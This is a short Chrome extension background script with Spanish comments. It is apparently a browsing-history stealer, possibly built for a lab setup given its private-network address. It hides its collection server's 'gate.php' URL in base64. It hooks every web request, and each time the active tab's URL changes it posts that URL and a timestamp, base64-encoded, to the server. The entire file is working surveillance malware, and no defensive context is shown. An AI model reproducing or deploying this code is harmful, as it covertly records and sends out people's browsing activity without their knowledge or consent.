'use strict';

//Url del servidor codificada en base64
var codeSvr = "aHR0cDovLzE5Mi4xNjguMS4zOC9nYXRlLnBocA==" 
//Decodificamos la URL que vamos a solicitar via Ajax
var SRV = atob (codeSvr)
//Se almacena la última URL enviada
var oldUrl = ""


//Activa con cada webRequest----------------------------------------------------------------------- 
chrome.webRequest.onBeforeRequest.addListener(function(details){
	chrome.tabs.getSelected(null,function(tab){
  	 	if ((tab.url != null) && (tab.url != "chrome://newtab/")&& (checkForURLchange(tab.url))){
  	 		var date = new Date (details.timeStamp);
  	 		var pageInfo = {
				Url: tab.url,
				Time: date.toString()
			};
 			sendData(JSON.stringify(pageInfo));
   		}
	});
  },
  { urls: ["<all_urls>"],},
);

//Incluir retardos en milisegundos---------------------------------------------------------------- 
function sleep(milliSeconds){
	var startTime = new Date().getTime();
	while (new Date().getTime() < startTime + milliSeconds);
}

//Comprueba si ha cambiado la URL y actualiza el valor de oldUrl----------------------------------
function checkForURLchange(currentUrl) {
	if (oldUrl != currentUrl) {
		console.log ('true ' + oldUrl + ' '+currentUrl);
		oldUrl = currentUrl;
		return true;
	}else {
		console.log('false ' + oldUrl + ' '+currentUrl);
		return false;
	}
}

//Funcion para el envio de datos al servidor-------------------------------------------------------
function sendData(data) {
	console.log ('aqui llega' + data);
	var ajaxReq = new XMLHttpRequest();
	ajaxReq.open("POST", SRV, true);
	ajaxReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	ajaxReq.send("url=" + btoa(data)); 
	ajaxReq.onreadystatechange = function (){
		if (ajaxReq.readyState == 4 && ajaxReq.status == 200){
			console.log (ajaxReq.responseText);
		}
	}
}
